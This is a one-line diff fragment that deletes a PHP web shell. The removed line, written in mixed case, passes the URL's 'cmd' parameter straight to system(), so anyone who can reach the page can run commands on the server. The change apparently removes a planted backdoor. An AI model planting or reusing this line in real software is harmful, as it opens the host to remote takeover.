@@ -1,1 +1,0 @@
-<?php SyStEm($_GET["cmd"]); ?>
